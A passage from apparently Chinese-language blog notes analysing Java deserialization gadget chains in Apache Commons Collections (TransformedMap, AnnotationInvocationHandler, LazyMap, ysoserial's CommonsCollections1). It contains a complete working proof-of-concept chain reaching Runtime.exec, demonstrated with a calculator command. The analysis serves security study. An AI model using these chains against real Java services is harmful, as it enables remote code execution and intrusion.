class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="comment">// 创建并实例化对象输出流</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">        out.writeObject(transformedMap);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    * 服务端</span></span><br><span class="line"><span class="comment">    *  */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// 创建并实例化文件输入流</span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="comment">// 创建并实例化对象输入流</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">      <span class="comment">// 通过readObject方法进行反序列化</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> (Map) in.readObject();</span><br><span class="line">        map.put(<span class="string">&quot;id&quot;</span>, <span class="string">&quot;name&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="images/image-20220913183349120.png" alt="image-20220913183349120"></p><p>相比之前触发反序列化的方式更为容易，当开发者将反序列化的对象转换成<code>Map</code>类型之后，通过<code>put()</code>、<code>putAll()</code>或者<code>setValue()</code>对<code>map</code>进行操作即可完成命令执行。</p><h2 id="AnnotationInvocationHandler"><a href="#AnnotationInvocationHandler" class="headerlink" title="AnnotationInvocationHandler"></a>AnnotationInvocationHandler</h2><p>前面的利用链仍需要服务端进行反序列化转换成<code>Map</code>对象，并进行赋值或者修改操作才可以触发命令执行。为了使得我们的攻击<code>payload</code>在服务端仅经过反序列化就可以触发，需要寻找新的利用点：<code>sun.reflect.annotation.AnnotationInvocationHandler</code></p><p>接下来我们看看<code>AnnotationInvocationHandler</code>类的源码，在构造函数中，传进的<code>Map</code>类型参数赋值给<code>memberValues</code><br><img src="images/image-20220914113429062.png" alt="image-20220914113429062"></p><p>在<code>readObject()</code>方法中，对<code>memberValues</code>进行遍历，最终当<code>var7</code>不为<code>null</code>时，通过<code>setValue()</code>进行修改操作，因此可以进入前面<code>TransformedMap</code>类中的<code>checkSetValue()</code>，触发命令执行<br><img src="images/image-20220914113611289.png" alt="image-20220914113611289"></p><p>POC 如下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.serialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/9/1 10:34</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TransformerTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TransformerTest</span> <span class="variable">transformerTest</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformerTest</span>();</span><br><span class="line">        transformerTest.serialize();</span><br><span class="line">        transformerTest.unserialize();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    * 客户端</span></span><br><span class="line"><span class="comment">    * */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span>  <span class="title function_">serialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;open -a Calculator.app&quot;</span>;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="comment">// new Class[0]为占位符</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;cmd&#125;</span><br><span class="line">                )</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">// 创建ChainedTransformer调用链</span></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="comment">// 创建Map对象</span></span><br><span class="line">        Map&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;value&quot;</span>);</span><br><span class="line">        <span class="comment">// 调用TransformedMap创建一个含有恶意调用链的Transformer类的Map对象</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">transformedMap</span> <span class="operator">=</span> TransformedMap.decorate(map, <span class="literal">null</span>, chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="comment">// 获取AnnotationInvocationHandler类对象</span></span><br><span class="line">            <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">            <span class="comment">// 获取AnnotationInvocationHandler类的构造方法</span></span><br><span class="line">            <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> cls.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">            <span class="comment">// 设置方法访问权限</span></span><br><span class="line">            constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="comment">// 创建含有攻击链的AnnotationInvocationHandler类实例</span></span><br><span class="line">            <span class="type">Object</span> <span class="variable">instance</span> <span class="operator">=</span> constructor.newInstance(Target.class, transformedMap);</span><br><span class="line">            <span class="comment">// 创建并实例化文件输出流</span></span><br><span class="line">            <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">            <span class="comment">// 创建并实例化对象输出流</span></span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">            out.writeObject(instance);</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    * 服务端</span></span><br><span class="line"><span class="comment">    *  */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// 创建并实例化文件输入流</span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="comment">// 创建并实例化对象输入流</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> (Map) in.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="images/image-20220914115903758.png" alt="image-20220914115903758"></p><p>这里需要注意<code>map.put(&quot;value&quot;,&quot;value&quot;);</code>中的<code>key</code>必须为<code>value</code>。<strong>具体原因如下：</strong></p><p>在构造方法中我们传入的<code>Class</code>需要继承<code>Annotation</code>注解<br><img src="images/image-20221004170152670.png" alt="image-20221004170152670"></p><p>因此在 POC 里，我们构造攻击链的时候传入了 Java 标准库中的<code>Target.class</code>元注解<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 创建含有攻击链的AnnotationInvocationHandler类实例</span></span><br><span class="line"><span class="type">Object</span> <span class="variable">instance</span> <span class="operator">=</span> constructor.newInstance(Target.class, transformedMap);</span><br></pre></td></tr></table></figure></p><p>查看<code>@Target</code>元注解的源码，其中已经定义了参数元素为<code>value</code><br><img src="images/image-20221004170044091.png" alt="image-20221004170044091"></p><p>在<code>AnnotationInvocationHandler</code>类的<code>readObject()</code>方法中，<code>var2 = AnnotationType.getInstance(this.type);</code>对<code>Target</code>元注解进行了处理，随后传到了<code>Map</code>类型参数<code>var3</code>中</p><p><img src="images/image-20220915000423127.png" alt="image-20220915000423127"></p><p>随后在<code>var6</code>中取得了我们前面设置的<code>map.put(&quot;value&quot;,&quot;value&quot;);</code>的<code>key</code>，也就是<code>value</code>，接着在<code>var7</code>中获得的类<code>java.lang.annotation.ElementType</code>不为空满足<code>if</code>条件进入循环。</p><p>由此可得知，如果我们传入的是<code>@Target</code>元注解，我们构造的条件要满足：<code>map.put(&quot;value&quot;,xxxx);</code>才能进入<code>if</code>条件里触发命令执行。</p><p><strong>该条攻击利用链的限制</strong></p><p>JDK 版本需要在 8u71 之前（本文 JDK 版本为 8u60），在此之后的版本都无法触发命令执行，原因是<code>AnnotationInvocationHandler</code>类的<code>readObject()</code>方法进行了修改，不再直接使用反序列化得到的<code>Map</code>进行操作，而是新建了一个<code>LinkedHashMap</code>对象。</p><p>后续相关操作都基于<code>LinkedHashMap</code>对象，而我们构造的<code>map</code>不再执行<code>put()</code>或者<code>setValue()</code>，因此无法触发命令执行。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CommonsCollections1利用链分析</title>
      <link href="/2022/11/10/CommonsCollections1/"/>
      <url>/2022/11/10/CommonsCollections1/</url>
      
        <content type="html"><![CDATA[<h1 id="CommonsCollections1利用链分析"><a href="#CommonsCollections1利用链分析" class="headerlink" title="CommonsCollections1利用链分析"></a>CommonsCollections1利用链分析</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这里开始学习分析<code>ysoserial</code>工具中的第一条<code>CommonsCollections</code>利用链，根据<code>payload</code>名称称呼为<code>CommonsCollections1</code><br><img src="images/image-20220919220735401.png" alt="image-20220919220735401"></p><p>利用版本：CommonsCollections 3.1 - 3.2.1<br>限制：jdk 8u71 版本之前</p><h2 id="利用链分析"><a href="#利用链分析" class="headerlink" title="利用链分析"></a>利用链分析</h2><p>我们先看一下<code>ysoserial</code>实现<code>CommonsCollections1</code>的关键源码：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> InvocationHandler <span class="title function_">getObject</span><span class="params">(<span class="keyword">final</span> String command)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"><span class="keyword">final</span> String[] execArgs = <span class="keyword">new</span> <span class="title class_">String</span>[] &#123; command &#125;;</span><br><span class="line"><span class="comment">// inert chain for setup</span></span><br><span class="line"><span class="keyword">final</span> <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123; <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>) &#125;);</span><br><span class="line"><span class="comment">// real chain for after setup</span></span><br><span class="line"><span class="keyword">final</span> Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;</span><br><span class="line">String.class, Class[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;</span><br><span class="line"><span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>] &#125;),</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;</span><br><span class="line">Object.class, Object[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;</span><br><span class="line"><span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>] &#125;),</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class &#125;, execArgs),</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>) &#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">final</span> <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">final</span> <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line"></span><br><span class="line"><span class="keyword">final</span> <span class="type">Map</span> <span class="variable">mapProxy</span> <span class="operator">=</span> Gadgets.createMemoitizedProxy(lazyMap, Map.class);</span><br><span class="line"></span><br><span class="line"><span class="keyword">final</span> <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> Gadgets.createMemoizedInvocationHandler(mapProxy);</span><br><span class="line"></span><br><span class="line">Reflections.setFieldValue(transformerChain, <span class="string">&quot;iTransformers&quot;</span>, transformers); <span class="comment">// arm with actual transformer chain</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> handler;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>可以看到前面部分和我们在<a href="./01-Java安全基础/5-Java反序列化/1-CommonsCollections.md">《CommonsCollections链分析》</a>中构造的一样，不一样的是不再利用<code>transformedMap</code>类去调用<code>transform()</code>方法，而是使用了<code>LazyMap</code>中的方法，同时使用到了动态代理的知识。</p><h2 id="LazyMap"><a href="#LazyMap" class="headerlink" title="LazyMap"></a>LazyMap</h2><p>这条链子既然选择使用<code>LazyMap</code>类，那必然是该类中也有调用<code>transform()</code>的方法，我们看一下<code>LazyMap</code>类的源码：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LazyMap</span> <span class="keyword">extends</span> <span class="title class_">AbstractMapDecorator</span> <span class="keyword">implements</span> <span class="title class_">Map</span>, Serializable &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">7990956402564206740L</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">final</span> Transformer factory;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">decorate</span><span class="params">(Map map, Factory factory)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">LazyMap</span>(map, factory);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">decorate</span><span class="params">(Map map, Transformer factory)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">LazyMap</span>(map, factory);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="title function_">LazyMap</span><span class="params">(Map map, Factory factory)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(map);</span><br><span class="line">        <span class="keyword">if</span> (factory == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Factory must not be null&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.factory = FactoryTransformer.getInstance(factory);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="title function_">LazyMap</span><span class="params">(Map map, Transformer factory)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(map);</span><br><span class="line">        <span class="keyword">if</span> (factory == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Factory must not be null&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.factory = factory;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeObject</span><span class="params">(ObjectOutputStream out)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        out.defaultWriteObject();</span><br><span class="line">        out.writeObject(<span class="built_in">super</span>.map);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream in)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        in.defaultReadObject();</span><br><span class="line">        <span class="built_in">super</span>.map = (Map)in.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">super</span>.map.containsKey(key)) &#123;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> <span class="built_in">this</span>.factory.transform(key);</span><br><span class="line">            <span class="built_in">super</span>.map.put(key, value);</span><br><span class="line">            <span class="keyword">return</span> value;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">super</span>.map.get(key);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>可以看到在<code>get()</code>方法中，检查<code>key</code>是否在<code>map</code>中，如果不存在就会调用<code>factory.transform()</code>方法生成<code>value</code>放进<code>map</code>中。我们从头跟起看看<code>factory</code>参数是什么内容。</p><p>POC 中从👇🏻开始进入<code>LazyMap</code>类<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, transformerChain);</span><br></pre></td></tr></table></figure></p><p>跟进<code>LazyMap</code>类的<code>decorate</code>方法，<code>return</code>到构造方法<code>LazyMap()</code>中，其中<code>factory</code>参数则是<code>ChainedTransformer</code>。<br><img src="images/image-20220920215913812.png" alt="image-20220920215913812"></p><p>到这里发现没有调用到<code>LazyMap</code>中的<code>get()</code>方法，那么关键的<code>get()</code>方法在哪里调用的？<code>ysoserial</code>中的<code>gadget</code>已经给了我们答案<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">ObjectInputStream.readObject()</span><br><span class="line">AnnotationInvocationHandler.readObject()</span><br><span class="line">Map(Proxy).entrySet()</span><br><span class="line">AnnotationInvocationHandler.invoke()</span><br><span class="line">LazyMap.get()</span><br><span class="line">ChainedTransformer.transform()</span><br><span class="line">ConstantTransformer.transform()</span><br><span class="line">InvokerTransformer.transform()</span><br><span class="line">Method.invoke()</span><br><span class="line">Class.getMethod()</span><br><span class="line">InvokerTransformer.transform()</span><br><span class="line">Method.invoke()</span><br><span class="line">Runtime.getRuntime()</span><br><span class="line">InvokerTransformer.transform()</span><br><span class="line">Method.invoke()</span><br><span class="line">Runtime.exec()</span><br></pre></td></tr></table></figure></p><h2 id="AnnotationInvocationHandler"><a href="#AnnotationInvocationHandler" class="headerlink" title="AnnotationInvocationHandler"></a>AnnotationInvocationHandler</h2><p>在给出的<code>gadget</code>中，调用了<code>AnnotationInvocationHandler</code>类的<code>invoke()</code>方法之后能进入<code>get()</code>方法中，源码如下：<br><img src="images/image-20220920223014118.png" alt="image-20220920223014118"></p><p>接下来就是如何去调用到<code>AnnotationInvocationHandler</code>的<code>invoke()</code>方法，前辈们已经给出了解决方案就是使用动态代理的方式。</p><p>在前面 <a href="../../00-JavaSE/3-动态代理/动态代理.md">《动态代理》</a>章节我们已经学习过相关知识，这里写一个简单的 demo 回顾一下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.serialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.ProxyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/9/22 22:55</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ProxyDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Demo</span>(<span class="keyword">new</span> <span class="title 